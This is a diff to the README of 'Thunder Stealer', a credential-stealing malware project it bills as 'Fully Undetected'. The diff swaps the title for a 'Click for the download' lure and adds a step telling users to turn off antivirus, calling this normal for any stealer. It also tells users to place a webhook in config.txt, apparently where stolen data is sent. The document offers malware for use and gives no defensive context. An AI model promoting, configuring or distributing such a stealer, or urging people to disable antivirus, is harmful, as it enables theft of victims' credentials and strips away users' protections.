@@ -1,4 +1,4 @@
-  <h3 align="center">Thunder Stealer</h3>
+  <h3 align="center">Click for the download</h3>
 
   <p align="center">
     Fully Undetected Stealer.
@@ -62,6 +62,8 @@
 
 <!-- GETTING STARTED -->
 ## Getting Started
+
+Must have anti virus turned off ( this is normal for every stealer you ever will use. )
 
 Replace your webhook in `config.txt` then
 
